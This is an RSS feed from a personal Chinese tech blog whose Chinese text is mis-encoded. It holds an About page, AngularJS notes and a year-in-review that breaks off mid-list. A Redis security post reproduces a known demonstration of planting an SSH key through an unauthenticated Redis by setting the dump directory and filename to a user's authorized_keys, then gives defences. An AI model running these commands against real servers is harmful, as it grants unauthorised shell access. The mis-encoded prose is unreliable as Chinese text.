<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>ç’æ¿’æ®‰æ¼‚æµè®°</title>
    <link>https://lawulu.github.io/feed/index.xml</link>
    <description>Recent content on ç’æ¿’æ®‰æ¼‚æµè®°</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>zh-CN</language>
    <lastBuildDate>Tue, 21 Feb 2017 00:00:00 +0000</lastBuildDate>
    <atom:link href="https://lawulu.github.io/feed/index.xml" rel="self" type="application/rss+xml" />
    
    <item>
      <title>About</title>
      <link>https://lawulu.github.io/about/</link>
      <pubDate>Tue, 21 Feb 2017 00:00:00 +0000</pubDate>
      
      <guid>https://lawulu.github.io/about/</guid>
      <description>

&lt;h3 id=&#34;å…³äºæœ¬ç«™&#34;&gt;å…³äºæœ¬ç«™&lt;/h3&gt;

&lt;ol&gt;
&lt;li&gt;æŠŠä¸€ä¸ªæŠ€æœ¯ææ‡‚å†è®²æ¸…æ¥š,æ˜¯å¾ˆèŠ±è´¹ç²¾åŠ›å’Œä½“ç°èƒ½åŠ›çš„äº‹.
è²Œä¼¼,æˆ‘éƒ½æ¯”è¾ƒæ¬ ç¼º,æ‰€ä»¥æœ¬ç«™æŠ€æœ¯ç±»æ–‡ç« éƒ½æ˜¯åªè¨€ç‰‡è¯­çš„æ³›æ³›è€Œè°ˆ,ç°åšåˆ°åªä¸ºè®°å½•,ä¸ä¸ºåˆ†äº«å§.&lt;/li&gt;
&lt;li&gt;ä¹‹å‰å¾ˆå¤šå†å²æ–‡ç« éƒ½æ˜¯ç”¨çš„è‹±æ–‡æ ‡ç‚¹,åœ¨ç°åœ¨æ¨¡æ¿ä¸‹,æ˜¾ç¤ºæ•ˆæœå¾ˆå·®,æœ‰æ—¶é—´è°ƒæ•´ä¸€ä¸‹.&lt;/li&gt;
&lt;li&gt;é™†ç»­è¿ç§»å†å²æ–‡ç« ä¸­&amp;hellip;&lt;/li&gt;
&lt;/ol&gt;

&lt;h3 id=&#34;æœ¬ç«™åˆ†ç±»&#34;&gt;æœ¬ç«™åˆ†ç±»&lt;/h3&gt;

&lt;ul&gt;
&lt;li&gt;&lt;code&gt;çˆ†æ ˆ&amp;amp;åŸºçº¿å™¨&lt;/code&gt; å…·ä½“æŠ€æœ¯ç›¸å…³çš„éšç¬”,å–è‡ªStackOverflowå’ŒGithub,å› ä¸ºæœ‰ç§è¯´æ³•ç¼–ç¨‹å°±æ˜¯ä»ä¸Šé¢ä¸¤ä¸ªç½‘ç«™Copy&amp;amp;Paste,è¿™ä¸ªåˆ†ç±»æ›´åƒä¸€ä¸ªå¸¦æ–‡å­—è¯´æ˜çš„ä¸ªäººçš„gist.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;Aijä¸€æ€è€ƒ&lt;/code&gt; å·¥ä½œç”Ÿæ´»ä¸­çš„ä¸€äº›æ„Ÿæ‚Ÿ,å–è‡ªâ€œäººç±»ä¸€æ€è€ƒä¸Šå¸å°±å‘ç¬‘â€å’Œé»‘å®¢å¸å›½é‡Œé¢çš„Matrix&lt;/li&gt;
&lt;li&gt;&lt;code&gt;ä»¥å¾·æœäºº&lt;/code&gt; å…³äºå…¬å¸ç®¡ç†å’ŒèŒä¸šç”Ÿæ¶¯çš„ä¸€äº›æ€è€ƒå’Œç»éªŒ,å–è‡ªåŠŸå¤«çš‡å¸æ–¹ä¸–ç‰ä¸­é›·è€è™çš„å£å¤´ç¦…â€œä»¥å¾·æœäººâ€å’Œä¸‰å›½æ€åˆ˜å¤‡çš„å°è¯.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;AkiRoss&lt;/code&gt; æŠ€æœ¯æ¶æ„æˆ–è€…ä¸šç•Œæ–°é—»ç›¸å…³,æ¯”&lt;code&gt;çˆ†æ ˆ&amp;amp;åŸºçº¿æœŸ&lt;/code&gt;è¦å®è§‚,å–è‡ªå½“å¹´æœ€ç»ˆå¹»æƒ³ç”µå½±ç‰ˆçš„å¥³ä¸»è§’&lt;a href=&#34;http://finalfantasy.wikia.com/wiki/Aki_Ross&#34;&gt;Aki Ross&lt;/a&gt;çš„åå­—,&lt;code&gt;AkiRoss&lt;/code&gt;å’Œ&lt;code&gt;architect&lt;/code&gt;å‰é¢è¯»éŸ³ä¸€æ ·.Aki Rossæ˜¯æˆ‘åˆšæ¥è§¦è®¡ç®—æœºæ—¶å€™è®¤ä¸ºæœ€å®Œç¾çš„å¥³æ€§å½¢è±¡.&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&#34;æœ¬ç«™å†å²&#34;&gt;æœ¬ç«™å†å²&lt;/h3&gt;

&lt;ul&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;2003å¹´&lt;/strong&gt;
éšç€åšå®¢çš„å…´èµ·åœ¨å¤©æ¶¯å’Œæ–¹å…´ä¸œçš„åšå®¢ä¸­å›½å¼€å§‹å†™åšå®¢,åæ¥åœ¨MSN Spaceå†™è¿‡ä¸€æ®µæ—¶é—´,è‡ªç„¶æ²¡æœ‰åšæŒä¸‹æ¥&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;&lt;strong&gt;2006å¹´&lt;/strong&gt;
å› ä¸ºç™¾åº¦ç©ºé—´å¯ä»¥å¯¼å…¥MSN Space,è®¿é—®é€Ÿåº¦åˆå¿«,åœ¨ç™¾åº¦æ–­æ–­ç»­ç»­å†™äº†å››äº”å¹´.é«˜å³°æ—¶å€™,ä¸ç®¡æ˜¯æ— ç—…å‘»åŸè¿˜æ˜¯æ— èŠè½¬å‘,è™½ç„¶åŸºæœ¬éƒ½æ˜¯è‡ªå—¨,ä½†å¹³å‡ä¸€æœˆèƒ½å†™ä¸€ç¯‡.&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;&lt;strong&gt;2015å¹´&lt;/strong&gt;
ç™¾åº¦å®¡æŸ¥ä¸¥å‰æ—¶å€™,æˆ‘æ²¡æœ‰ç¦»å¼€ï¼›ç™¾åº¦å¼ºåˆ¶å‡çº§æ—¶å€™,æˆ‘æ²¡æœ‰ç¦»å¼€ï¼›ç»ˆäº,ç™¾åº¦ç©ºé—´å…³é—­äº†â€¦â€¦&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;&lt;strong&gt;2017å¹´&lt;/strong&gt;
ä¸€ç›´æƒ³ç€è‡ªå·±å»ºä¸€ä¸ªè‡ªæœ‰åšå®¢.å› ä¸ºä¸€ç›´å¯¹npmæ•¬è€Œè¿œä¹‹,16å¹´æ—¶å€™æŠ˜è…¾è¿‡ä¸€æ®µHexoç›´æ¥æ”¾å¼ƒ,ï¼ˆå³ä½¿Dockerä¹Ÿä¸å¤ªæ–¹ä¾¿).å°±é€‰æ‹©äº†Hugo.å”¯ä¸€ç¾ä¸­ä¸è¶³çš„æ˜¯æ¨¡æ¿æœ‰ç‚¹å°‘.&lt;/p&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&#34;todo&#34;&gt;TODO&lt;/h3&gt;

&lt;ul class=&#34;task-list&#34;&gt;
&lt;li&gt;&lt;input type=&#34;checkbox&#34; disabled class=&#34;task-list-item&#34;&gt; é™æ€ç½‘ç«™ç¼ºç‚¹æ˜¯å¯¹å¸–å­Metadataçš„ç®¡ç†ä¸æ–¹ä¾¿,éœ€è¦æƒ³åŠæ³•å¤„ç†ä¸€ä¸‹.è¯è¯´å¯¹æ–‡æœ¬æ–‡ä»¶è®¾ç½®metadataæ€ä¹ˆæ²¡æœ‰æµè¡Œèµ·æ¥ï¼Ÿç°åœ¨S3å’ŒOSSéƒ½æ˜¯æœ‰metadataçš„&lt;/li&gt;
&lt;li&gt;&lt;input type=&#34;checkbox&#34; disabled class=&#34;task-list-item&#34;&gt; ç¼–è¾‘å™¨ï¼ˆæˆ‘ç”¨æœ‰é“)å’ŒHexoå¯¹Markdownçš„è¯­æ³•æ”¯æŒä¸ä¸€è‡´,æ’å…¥å›¾ç‰‡ä¹Ÿä¸æ–¹ä¾¿.Goè¿˜æ˜¯æ¯”è¾ƒå¹´è½»,è²Œä¼¼å¯ä¾›é€‰æ‹©çš„Markdownæ¸²æŸ“ä¹Ÿä¸å¤š,å›å¤´ç ”ç©¶ä¸€ä¸‹&lt;/li&gt;
&lt;li&gt;&lt;input type=&#34;checkbox&#34; disabled class=&#34;task-list-item&#34;&gt; æƒ³åŠæ³•æŠŠç™¾åº¦çš„æ–‡ç« ä»¥åŠæ”¾åˆ°å¾®åšå¾®ä¿¡çŸ¥ä¹ä¸Šçš„ä¸œè¥¿å†™ç¨‹åºå¯¼è¿‡æ¥&lt;/li&gt;
&lt;li&gt;&lt;input type=&#34;checkbox&#34; checked disabled class=&#34;task-list-item&#34;&gt; &lt;del&gt;Table Contentæ”¯æŒ&lt;/del&gt;&lt;/li&gt;
&lt;li&gt;&lt;input type=&#34;checkbox&#34; disabled class=&#34;task-list-item&#34;&gt; Git submoduleç ”ç©¶â€¦â€¦è²Œä¼¼çªç„¶ä¸è¡Œäº†,ç°åœ¨åªèƒ½åœ¨Ideaé‡Œé¢æäº¤&lt;/li&gt;
&lt;li&gt;&lt;input type=&#34;checkbox&#34; checked disabled class=&#34;task-list-item&#34;&gt; &lt;del&gt;ç™¾åº¦ç»Ÿè®¡&lt;/del&gt;&lt;/li&gt;
&lt;li&gt;&lt;input type=&#34;checkbox&#34; checked disabled class=&#34;task-list-item&#34;&gt; &lt;del&gt;å›¾ç‰‡æ’å…¥,TodoListè¯­æ³•&lt;/del&gt;&lt;/li&gt;
&lt;/ul&gt;
</description>
    </item>
    
    <item>
      <title>AngularJSåˆçª¥</title>
      <link>https://lawulu.github.io/post/AngularJS%E5%88%9D%E7%AA%A5/</link>
      <pubDate>Sun, 20 Nov 2016 00:00:00 +0000</pubDate>
      
      <guid>https://lawulu.github.io/post/AngularJS%E5%88%9D%E7%AA%A5/</guid>
      <description>

&lt;p&gt;æ— æ•°äººåæ§½è¿‡å‰ç«¯æ¡†æ¶çš„å±‚å‡ºä¸ç©·,çœ¼çœ‹å‰ç«¯å¼€å‘è¦è„±ç¦»æµè§ˆå™¨å…¼å®¹æ€§çš„è‹¦æµ·,åˆè¦è½å…¥æ¡†æ¶ç¢ç‰‡çš„æ·±å‘.ä»è¯­è¨€æœ¬èº«åˆ°ç¼–è¯‘åˆ°æ‰“åŒ…åˆ°å¼€å‘æ¡†æ¶å„ç§æ¡†æ¶å±‚å‡ºä¸ç©·&amp;hellip;æ˜¯ç»ˆç«¯ç”¨æˆ·éœ€æ±‚å¤ªå¤šè¿˜æ˜¯å‰ç«¯å¤§ç‰›ä»¬é‡å¿ƒå¤ªå¤§? ä¸ç®¡æ€æ ·,æŠ¥Gå®¶å¤§è…¿é€‰æ‹©Angularä¼¼ä¹æ²¡ä»€ä¹ˆé—®é¢˜,å¦ä¸€ä¸ªå¤§è…¿çš„Reactiveæœ¬èº«ä¸æ˜¯ä¸€ä¸ªå®Œå¤‡çš„æ¡†æ¶.&lt;/p&gt;

&lt;h2 id=&#34;angularç®€ä»‹&#34;&gt;Angularç®€ä»‹&lt;/h2&gt;

&lt;ul&gt;
&lt;li&gt;&lt;p&gt;åœ¨Webå¼€å‘ä¸­éœ€è¦JSåšä»€ä¹ˆï¼Ÿ&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;ä¸æœåŠ¡å™¨äº¤äº’&lt;/li&gt;
&lt;li&gt;æ“ä½œDOM&lt;/li&gt;
&lt;li&gt;ç®€å•çš„é€»è¾‘æ§åˆ¶&lt;/li&gt;
&lt;li&gt;è¾“å…¥éªŒè¯&lt;/li&gt;
&lt;li&gt;è·¯ç”±&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;Angularåšäº†ä»€ä¹ˆæ”¹å˜ï¼Ÿ&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;å¼•å…¥äº†æŒ‡ä»¤,ngå¼€å¤´,æ¥æ‰©å±•HTML&lt;/li&gt;
&lt;li&gt;æ•°æ®ç»‘å®š,é€šè¿‡å¯¹HTMLå…ƒç´ å¢åŠ æŒ‡ä»¤ng-model&lt;/li&gt;
&lt;li&gt;ä½¿ç”¨directiveæ¥è‡ªå®šä¹‰æŒ‡ä»¤&lt;/li&gt;
&lt;li&gt;Scope,æä¾›äº†HTMLè§†å›¾å’ŒJSæ§åˆ¶å™¨ä¹‹é—´çš„çº½å¸¦&lt;/li&gt;
&lt;li&gt;Controller,å¯ä»¥è§†ä¸ºä¸€ä¸ª$Scopeçš„æ„é€ å‡½æ•°&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;æ•°æ®ç»‘å®š å³å°†Domçš„å˜åŒ–ç»‘å®šåˆ°æ•°æ®çš„å˜åŒ–ä¸Šé¢å»,å› ä¸ºç”¨çš„1,æ‰€ä»¥è¿™ä¸ªç»‘å®šæ˜¯åŒå‘çš„,æœ‰æ—¶å€™æƒ³åªæ”¹å˜é¡µé¢,ä¼šå½±å“åˆ°æ•°æ®&lt;/p&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&#34;ä½¿ç”¨ä¸€å‘¨çš„æ„Ÿå—&#34;&gt;ä½¿ç”¨ä¸€å‘¨çš„æ„Ÿå—&lt;/h2&gt;

&lt;h3 id=&#34;ä¸€äº›å‘&#34;&gt;ä¸€äº›å‘:&lt;/h3&gt;

&lt;ul&gt;
&lt;li&gt;httpæ˜¯å¼‚æ­¥,è¦åœ¨.functionä¸­å¤„ç†,æˆ–è€…ç»Ÿä¸€åœ¨é…ç½®é‡Œé¢è®¾ç½®&lt;code&gt;async : true&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;æ€ä¹ˆLazyåˆå§‹åŒ–ï¼Ÿæ²¡æœ‰æ‰¾åˆ°åŠæ³•&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&#34;controllerä¹‹é—´çš„äº¤äº’&#34;&gt;Controllerä¹‹é—´çš„äº¤äº’&lt;/h3&gt;

&lt;p&gt;ä¸¤ç§åŠæ³•&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;http://stackoverflow.com/questions/29467339/how-to-call-a-function-from-another-controller-in-angularjs&#34;&gt;http://stackoverflow.com/questions/29467339/how-to-call-a-function-from-another-controller-in-angularjs&lt;/a&gt;
æœ¬è´¨æ˜¯ç»‘å®šåˆ°RootScopeé‡Œé¢,é€šè¿‡äº‹ä»¶æ¥å“åº”&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;http://blog.csdn.net/findsafety/article/details/50403242&#34;&gt;http://blog.csdn.net/findsafety/article/details/50403242&lt;/a&gt;
åŸç”Ÿdomä¸jsçš„å¤„ç†åŠæ³•,å¯èƒ½ä¼šç‰ˆæœ¬ä¹‹é—´ä¸å…¼å®¹,æœ¬è´¨æ˜¯é€šè¿‡domæ‰¾åˆ°Ng-controllerçš„æ–¹æ³•.&lt;/li&gt;
&lt;/ul&gt;

&lt;pre&gt;&lt;code&gt;    var appElement = document.querySelector(&#39;[ng-controller=&amp;quot;EndCardEditCtrl as ctrl&amp;quot;]&#39;);
    var editCtrl = angular.element(appElement);
    
&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;ä¸jquery-jsä¹‹é—´çš„äº¤äº’&#34;&gt;ä¸Jquery/JSä¹‹é—´çš„äº¤äº’&lt;/h3&gt;

&lt;ul&gt;
&lt;li&gt;æœ‰æ—¶å€™Jqueryç»‘å®šFunctionæ—¶å€™,Domå¹¶æ²¡æœ‰ç”Ÿæˆ,æ‰€ä»¥éœ€è¦æ›¿æ¢æˆAngularçš„&lt;code&gt;ng-click&lt;/code&gt;äº‹ä»¶.&lt;/li&gt;
&lt;li&gt;JSä¸­å¯ä»¥é€šè¿‡å…ƒç´ æ¥æ‰¾çš„å…¶ç»‘å®šçš„scope
&lt;code&gt;
window.angular.element(&amp;quot;#divId&amp;quot;).scope().doSth()
&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&#34;angularçš„åˆ†æ”¯å¾ªç¯&#34;&gt;Angularçš„åˆ†æ”¯å¾ªç¯&lt;/h3&gt;

&lt;p&gt;Angularæä¾›äº†Ng-showç­‰é€»è¾‘åˆ¤æ–­,æ¥æ§åˆ¶é¡µé¢çš„å˜åŒ–.
æä¾›äº†Switchå’ŒForæ¥åšåˆ†æ”¯å’Œå¾ªç¯.
ç®€å•æ¥è¯´,åŸºæœ¬å¯ä»¥å¯¹Htmlçš„æ˜¾ç¤ºè¿›è¡Œç¼–ç¨‹.&lt;/p&gt;

&lt;h3 id=&#34;scope-apply&#34;&gt;$scope.$apply()&lt;/h3&gt;

&lt;p&gt;ç‚¹å‡»æŒ‰é’®ä¹‹å,ä¸ºä»€ä¹ˆä¼šç»‘å®šæˆåŠŸ?å¥¥ç§˜å°±åœ¨äºAngularæŠŠ&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;Events =&amp;gt; ng-click
Timeouts =&amp;gt; $timeout
jQuery.ajax() =&amp;gt; $http
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;éƒ½Wrapperäº†,åªè¦è¿™äº›äº‹ä»¶è¢«è§¦å‘,è‡ªåŠ¨è°ƒç”¨&lt;code&gt;$scope.$apply()&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;é—®é¢˜æ˜¯å¾ˆå¤šæ—¶å€™(åœ¨$scopeä¹‹å¤–çš„æ“ä½œ)éœ€è¦è‡ªå·±æ‰‹åŠ¨è°ƒç”¨, ä½†æ˜¯Angularåˆä¿è¯æ­¤æ–¹æ³•ä¸èƒ½è°ƒç”¨ä¸¤æ¬¡.
æ‰€ä»¥å®˜æ–¹æ¨èä½¿ç”¨Angularè‡ªå·±é‚£å¥—($Resource,$Route,serviceä¹‹ç±»&amp;hellip;).æ©,æœ‰ç§ä¸Šäº†è´¼èˆ¹çš„æ„Ÿè§‰.&lt;/p&gt;

&lt;h3 id=&#34;resource&#34;&gt;$Resource&lt;/h3&gt;

&lt;p&gt;ä¸€ä¸ªå¯¹HttpRestçš„å°è£…,ç®€å•çš„CRUDç¡®å®å¾ˆæ–¹ä¾¿,ä½†æ˜¯é‡åˆ°å¤æ‚çš„éœ€æ±‚å°±è¦æŠ“ç,å¾ˆå¤šæ—¶å€™éœ€è¦è°ƒæ•´åç«¯..æ‰€ä»¥æœ‰å¾ˆå¤šäººè¯´,Angularé€‚åˆåšç®€å•çš„CRUDåº”ç”¨.&lt;/p&gt;

&lt;h3 id=&#34;ng-change&#34;&gt;Ng-change&lt;/h3&gt;

&lt;p&gt;ng-change requires ng-model, without it will not work&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;Error: [$compile:ctreq] http://errors.angularjs.org/1.4.5/$compile/ctreq?p0=ngModel&amp;amp;p1=ngChange

&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;å¦å¤– ng-changeå¯¹Fileä¸ç”Ÿæ•ˆ&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;https://github.com/angular/angular.js/issues/1375&#34;&gt;https://github.com/angular/angular.js/issues/1375&lt;/a&gt;&lt;/p&gt;

&lt;h3 id=&#34;å•å…ƒæµ‹è¯•&#34;&gt;å•å…ƒæµ‹è¯•&lt;/h3&gt;

&lt;p&gt;Angularè½®äº†ä¸€å¥—Service,Factoryä¹‹æµ,è‡ªç„¶ä¹Ÿå°‘ä¸äº†å•å…ƒæµ‹è¯•..ä¸çŸ¥é“æœ‰å¤šå°‘äººä¼šä¸ºé¡µé¢å†™è¿™ç©æ„.&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Redisçš„å®‰å…¨å“²å­¦</title>
      <link>https://lawulu.github.io/post/Redis%E7%9A%84%E5%AE%89%E5%85%A8%E5%93%B2%E5%AD%A6/</link>
      <pubDate>Mon, 15 Feb 2016 00:00:00 +0000</pubDate>
      
      <guid>https://lawulu.github.io/post/Redis%E7%9A%84%E5%AE%89%E5%85%A8%E5%93%B2%E5%AD%A6/</guid>
      <description>

&lt;p&gt;æœ€è¿‘çœ‹åˆ°Redisçš„ä½œè€…antirezå†™çš„ä¸€ç¯‡blog: &lt;a href=&#34;http://antirez.com/news/96&#34;&gt;http://antirez.com/news/96&lt;/a&gt;
é‡Œé¢æœ‰äº›ä¸œè¥¿å¾ˆæœ‰æ„æ€.æ‘˜å½•ä¸€äº›è§‚ç‚¹:&lt;/p&gt;

&lt;h2 id=&#34;ä¸ºä»€ä¹ˆredisè¿™ä¹ˆå¤š-å®‰å…¨æ¼æ´&#34;&gt;ä¸ºä»€ä¹ˆRedisè¿™ä¹ˆå¤š&amp;rdquo;å®‰å…¨æ¼æ´&amp;rdquo;?&lt;/h2&gt;

&lt;p&gt;ä½œè€…è¯´ç»å¸¸æ”¶åˆ°ä¸€äº›Redisä¸å®‰å…¨çš„Report,ä½†æ˜¯å¤§éƒ¨åˆ†Reportå…¶å®è·ŸRedisæ²¡æœ‰ä»€ä¹ˆå…³ç³»æˆ–è€…è¯´å¯¹Redisæ¥è¯´æ— å…³ç´§è¦.å› ä¸ºRedisçš„ç»å¤§å¤šæ•°ç”¨æˆ·éƒ½æ˜¯å°†Redisæ”¾åˆ°ä¸€ä¸ªå®‰å…¨çš„ç¯å¢ƒé‡Œé¢,è€Œå®‰å…¨æ˜¯ä¸€ä¸ªå¾ˆå¤§çš„feature,Redisä¸ä¼šä¸ºäº†ä¸€å°æ’®ç”¨æˆ·åšå¼€å‘è¿™ä¹ˆå¤æ‚çš„åŠŸèƒ½.
&amp;gt;itâ€™s totally insecure to let untrusted clients access the system, please protect it from the outside world yourself&lt;/p&gt;

&lt;h2 id=&#34;ä¸€æ¬¡hackè¿‡ç¨‹&#34;&gt;ä¸€æ¬¡Hackè¿‡ç¨‹&lt;/h2&gt;

&lt;p&gt;å®‰å…¨é¡µé¢å†™åˆ°: &lt;a href=&#34;http://redis.io/topics/security&#34;&gt;http://redis.io/topics/security&lt;/a&gt;
&amp;gt;the ability to control the server configuration using the CONFIG command makes the client able to change the working directory of the program and the name of the dump file. This allows clients to write RDB Redis files at random paths, that is a security issue that may easily lead to the ability to run untrusted code as the same user as Redis is running&lt;/p&gt;

&lt;p&gt;æ‰€ä»¥,ä½¿ç”¨configå‘½ä»¤å¯ä»¥å¾€ä¸»æœºçš„Pathå†™æ–‡ä»¶,ä½œè€…å±•ç¤ºäº†è¿™ä¸€è¿‡ç¨‹(ä¸ºé˜²æ­¢æœ‰äº›&lt;code&gt;script kiddies cut &amp;amp; paste the attack&lt;/code&gt;,æ²¡æœ‰ç›´æ¥æä¾›ä¸€ä¸ªè„šæœ¬,å¹¶ä¸”è¿˜é¦–å…ˆå¤‡ä»½äº†å½“å‰çš„æ•°æ®,è¿™é‡Œçœç•¥ä¸€äº›æ— å…³ç´§è¦çš„æ­¥éª¤):&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;ç”Ÿæˆä¸€å¯¹RSA key,å¹¶ä¸”å†™åˆ°ä¸€ä¸ªæ–‡ä»¶é‡Œé¢,å‰ååŠ ä¸Šæ¢è¡Œç¬¦
&lt;code&gt;
$ (echo -e &amp;quot;\n\n&amp;quot;; cat id_rsa.pub; echo -e &amp;quot;\n\n&amp;quot;) &amp;gt; foo.txt
&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;å°†public keyå†™åˆ°ä¸€ä¸ªKVé‡Œé¢
&lt;code&gt;
cat foo.txt | redis-cli -h 192.168.1.11 -x set crackit
&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;è®¾ç½®å·¥ä½œç›®å½•
&lt;code&gt;
config set dir /Users/antirez/.ssh/
&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;å°†å†…å­˜ä¸­æ•°æ®ä¿å­˜åˆ°Dbæ–‡ä»¶ä¸­
&lt;code&gt;
config set dbfilename &amp;quot;authorized.keys&amp;quot;
save
&lt;/code&gt;&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;å¤§åŠŸå‘Šæˆ!&lt;/p&gt;

&lt;h2 id=&#34;ä¸ºä»€ä¹ˆä¸é»˜è®¤bind-127-0-0-1&#34;&gt;ä¸ºä»€ä¹ˆä¸é»˜è®¤bind 127.0.0.1?&lt;/h2&gt;

&lt;p&gt;äº‹å®ä¸Š,å¦‚æœå¯åŠ¨æ—¶å€™å¸¦ä¸Šé»˜è®¤çš„é…ç½®æ–‡ä»¶(redis.conf),å°±ä¸å­˜åœ¨è¿™ä¸ªå®‰å…¨éšæ‚£,å› ä¸ºé…ç½®æ–‡ä»¶é‡Œé¢é»˜è®¤æ˜¯åªç»‘å®šäº†Loopback address.æ—¢ç„¶ä½œè€…çŸ¥é“è¿™ä¸ªå®‰å…¨éšæ‚£,ä¸ºä»€ä¹ˆä¸é»˜è®¤å¯ç”¨è¿™ä¸ªé…ç½®æ–‡ä»¶å‘¢?(å°±åƒMysqlé‚£æ ·).&lt;/p&gt;

&lt;p&gt;ä½œè€…çš„è§£é‡Šæ˜¯,å› ä¸ºRTFMï¼ˆRead The Fucking Manualï¼‰&lt;/p&gt;

&lt;h2 id=&#34;ä½¿ç”¨auth&#34;&gt;ä½¿ç”¨Auth&lt;/h2&gt;

&lt;p&gt;è™½ç„¶å¹¶ä¸èƒ½çœŸæ­£è§£å†³å®‰å…¨é—®é¢˜..æœ€ç®€å•æœ‰æ•ˆçš„æ–¹æ³•å°±æ˜¯ä½¿ç”¨Auth.ä½¿ç”¨Authçš„çš„å‡ ç‚¹è¯´æ˜:&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;å¯†ç è¦å°½å¯èƒ½çš„å¤æ‚,ä»¥é˜²è¢«brute force&lt;/li&gt;
&lt;li&gt;Authçš„æ¶ˆè€—éå¸¸å°‘,åªæ˜¯åœ¨è¿æ¥å»ºç«‹æ—¶å€™åšä¸€æ¬¡é‰´æƒ,åªæœ‰è¿æ¥åœ¨,å°±ä¸ç”¨å†åšé‰´æƒ&lt;/li&gt;
&lt;li&gt;æœªæ¥å¯èƒ½ä¼šæœ‰ACLæœºåˆ¶,æ¯”å¦‚æŸäº›ç”¨æˆ·å¹¶æ²¡æœ‰&lt;code&gt;config set dir&lt;/code&gt;çš„æƒé™&lt;/li&gt;
&lt;/ol&gt;
</description>
    </item>
    
    <item>
      <title>How 2015 flies</title>
      <link>https://lawulu.github.io/post/%E6%88%91%E7%9A%842015/</link>
      <pubDate>Sun, 03 Jan 2016 00:00:00 +0000</pubDate>
      
      <guid>https://lawulu.github.io/post/%E6%88%91%E7%9A%842015/</guid>
      <description>

&lt;p&gt;å…‰é˜´è€…,ç™¾ä»£ä¹‹è¿‡å®¢ä¹Ÿ.åœ¨æˆ‘å¹´å°‘ç•…æƒ³æœªæ¥æ—¶å€™,2015ä»æ¥éƒ½æ˜¯é¥è¿œçš„,è€Œç°åœ¨,ä¸ç®¡æ›¾ç»å¤šå°‘æ¢¦æƒ³ä¸ç®¡æ›¾ç»å¤šå°‘é—æ†¾,2015å·²ç»å½»åº•é€è€…å¦‚æ–¯å¤«äº†.è¿™ä¸€å¹´,å‘ç”Ÿäº†ä»€ä¹ˆï¼Ÿ&lt;/p&gt;

&lt;h2 id=&#34;æ—¶é—´çº¿&#34;&gt;æ—¶é—´çº¿&lt;/h2&gt;

&lt;ul&gt;
&lt;li&gt;å¹´åˆSæ•´ä¸ªå…¬å¸ä¸šç»©ä¸å¥½,åŠ ä¸Šé¡¹ç›®è¢«cut off,ä¸€ç›´æƒ³ç€æ¢å·¥ä½œ.åæ¥åˆåšäº†åŠå¹´æ–°é¡¹ç›®,åè€Œæ›´åŠ åšå®šäº†ç¦»å¼€çš„å¿µå¤´.&lt;/li&gt;
&lt;li&gt;6æœˆä»½æœ‰äº†æ–°å»å¤„,ä½†æ˜¯è¢«Sçš„ä¸€ä¸ªé¢†å¯¼æ‹‰å»ç°åœ¨å…¬å¸C,ä¸­é—´æ–­æ–­ç»­ç»­å¥½å‡ ä¸ªæœºä¼šéƒ½æ˜¯Så…¬å¸çš„äººè„‰,æ€»çš„æ¥è¯´,è™½ç„¶ä¸€ç›´åæ‚”è¯´åº”è¯¥æ—©ç‚¹ç¦»å¼€,ä½†åœ¨Så…¬å¸è¿˜æ˜¯éå¸¸æ„‰å¿«å’Œå€¼å¾—ç•™å¿µçš„.&lt;/li&gt;
&lt;li&gt;åœ¨å…¬å¸Cä¸‰ä¸ªæœˆä¹‹å,Cå…¬å¸å‘ç”Ÿå¤§çš„äººäº‹å˜åŠ¨,ç»§å¹´åˆä¹‹å,å†ä¸€æ¬¡è§è¯†åˆ°äº†èŒåœºçš„æ³¢æ¾œå£®é˜”.æ— æ„§äºå¿ƒ,ä¸“å¿ƒåšå¥½è‡ªå·±çš„äº‹,æé«˜è‡ªå·±æ‰æ˜¯ç‹é“.&lt;/li&gt;
&lt;li&gt;9æœˆä»½,è®¸ä¹…çš„æœŸç›¼ä¹‹å,åª³å¦‡ç»ˆäºç¡®è®¤æ€€å­•.å¤‡å­•è‚²å„¿è¿™äº‹æ˜¯æå‡å¤«å¦»å’Œè°å…³ç³»å¢åŠ å®¶åº­è´£ä»»æ„Ÿçš„ä¸€ä»¶é‡è¦äº‹æƒ….&lt;/li&gt;
